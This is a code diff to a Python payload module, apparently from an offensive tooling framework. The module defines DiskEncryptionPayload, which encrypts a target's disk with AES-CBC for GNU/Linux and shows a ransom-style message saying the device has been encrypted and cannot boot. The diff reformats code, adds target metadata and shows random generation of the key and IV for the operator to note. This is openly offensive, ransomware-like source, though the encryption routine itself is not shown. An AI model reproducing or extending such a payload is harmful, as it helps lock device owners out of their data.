@@ -3,11 +3,14 @@ Encrypt disk with AES-CBC
 """
 import random
 
-from snr.core.payload.payload import Payload, Context
+from snr.core.payload.payload import Context, Payload
 from snr.core.util import common_utils
+
 
 class DiskEncryptionPayload(Payload):
     AUTHORS = ("GlobularOne",)
+    TARGET_OS_LIST = ("GNU/Linux",)
+    ROOTFS_VERSION = 2
     DEFAULT_MESSAGE = b"This device has been encrypted. Continuing boot is not possible."
     BIOS_PAYLOAD: bytes
 
@@ -28,12 +31,14 @@ class DiskEncryptionPayload(Payload):
         variables = {}
         variables["MESSAGE"] = message_unencoded
         message_encoded = message_unencoded.encode()
-        common_utils.print_warning("Generating a random IV! Ensure you take note of it")
+        common_utils.print_warning(
+            "Generating a random IV! Ensure you take note of it")
         iv = random.SystemRandom().randbytes(16)
         common_utils.print_ok(f"Your IV is: {iv.hex()}")
         variables["IV"] = common_utils.bytes_to_str_repr(iv)
 
-        common_utils.print_warning("Generating a random key! Ensure you take note of it")
+        common_utils.print_warning(
+            "Generating a random key! Ensure you take note of it")
         key_raw = random.SystemRandom().randbytes(32)
         common_utils.print_ok(f"Your key is: {key_raw.hex()}")
         variables["KEY"] = common_utils.bytes_to_str_repr(key_raw)
